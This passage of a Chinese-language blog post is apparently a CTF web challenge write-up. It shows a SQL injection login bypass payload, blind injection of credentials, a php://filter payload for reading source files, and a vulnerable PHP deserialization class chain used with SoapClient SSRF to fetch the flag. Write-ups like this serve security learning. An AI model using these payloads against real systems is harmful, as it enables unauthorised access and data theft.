+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listData = $_REQUEST;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loadView(<span class="string">'userIndex'</span>,$listData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用loadview将userindex包含进来，参数可以由$_REQUEST控制，这样就很清楚了，控制下img_file参数，直接拿到flag.</p>
+<h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><p>进来又是一个登陆界面…</p>
+<p>两个方法可以登陆进去</p>
+<p>首先是万能密码的做法</p>
+<p>这道题的验证机制和普通的验证的机制不太相同</p>
+<p>传统的语句是把post过来的密码用户拼接到一条语句中进行query，造成注入。</p>
+<p>第二种验证机制是把密码和用户分开来，先通过执行第一个sql语句也就是查询用户名的sql语句，把对应的密码查出来，再和post的密码进行比较判断，如果相同，就判断成功</p>
+<p>这个题也就是用的第二种验证机制</p>
+<p>在我们输入普通的万能密码 ‘ or ‘1’#的时候返回的是Wrong password</p>
+<p>在输入正常用户名密码的时候返回的是Wrong username or password，这样就正好符合了上面的这个逻辑，在密码单独认证的步骤肯定是返回密码错误的，这里可以用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span><span class="string">' group by passwd with rollup having passwd is NULL --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">密码为空进行绕过</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgse.com/i/QrSnL6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/10/QrSnL6.md.png" alt="QrSnL6.md.png"></a></p>
+<p>本来是想着不传passwd字段的，这样和NULL才能正常匹配，不过这道题用的是弱类型比较，所以passwd传不传都是可以的</p>
+<p>这里通过注入也是可以进去的</p>
+<p>先注入用户名，看一下下面的图就可以懂这个注入的逻辑了</p>
+<p><a href="https://imgse.com/i/Qsubsf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/Qsubsf.md.png" alt="Qsubsf.md.png"></a></p>
+<p>当字母错误返回用户名或密码错误，当字符正确返回密码错误</p>
+<p>注入完用户名之后，开始注入密码</p>
+<p><a href="https://imgse.com/i/QsMQ9s" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QsMQ9s.md.png" alt="QsMQ9s.md.png"></a></p>
+<p>写下脚本跑下就ok了</p>
+<p>进入后可以File_read配和伪协议读源码</p>
+<p>读index.php</p>
+<p>post: filename=php://filter/read=convert.base64-encode/resource=index.php</p>
+<p>依次可以读取到encode.php,index.php,interface.php,se.php</p>
+<p>通过encode.php伪造admin身份，去尝试getflag,给出的回显是只能通过127.0.0.1去打，也就是要ssrf,这时不难想到利用Soap+ssrf结合se.php拿flag</p>
+<p>se.php代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">				&#123;</span><br><span class="line">					$s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">					$s1();</span><br><span class="line">				&#125;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">		&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">		<span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $name;</span><br><span class="line">		<span class="keyword">public</span> $flag;</span><br><span class="line">		<span class="keyword">public</span> $b;</span><br><span class="line">		  </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">			session_start(); </span><br><span class="line">			var_dump($_SESSION);</span><br><span class="line">			$a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">			<span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>pop链的构造挺简单的，就不详细说了，最终去调用Soapclient类getflag方法，并且访问的是interface.php，而不是index.php?method=get_flag,因为SoapServer是在interface.php声明的</p>
+<p>interface.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先把session数据传上去</p>
+<p><a href="https://imgse.com/i/QrfOEV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QrfOEV.md.png" alt="QrfOEV.md.png"></a></p>
+<p>触发反序列化拿到flag</p>
+<p><a href="https://imgse.com/i/QrhkE6" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/11/QrhkE6.md.png" alt="QrhkE6.md.png"></a></p>
+<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>该准备期末考试了，寒假见！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" rel="next" title="2019安洵杯web题解">
+                <i class="fa fa-chevron-left"></i> 2019安洵杯web题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/12/%E5%AF%B9%E4%BA%8E2019%E5%B9%B4%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E6%80%BB%E7%BB%93/" rel="prev" title="对于2019年的思考与总结">
+                对于2019年的思考与总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web1"><span class="nav-number">2.</span> <span class="nav-text">Web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web2"><span class="nav-number">3.</span> <span class="nav-text">Web2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web3"><span class="nav-number">4.</span> <span class="nav-text">Web3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web4"><span class="nav-number">5.</span> <span class="nav-text">Web4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web6"><span class="nav-number">6.</span> <span class="nav-text">Web6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后记"><span class="nav-number">7.</span> <span class="nav-text">后记</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
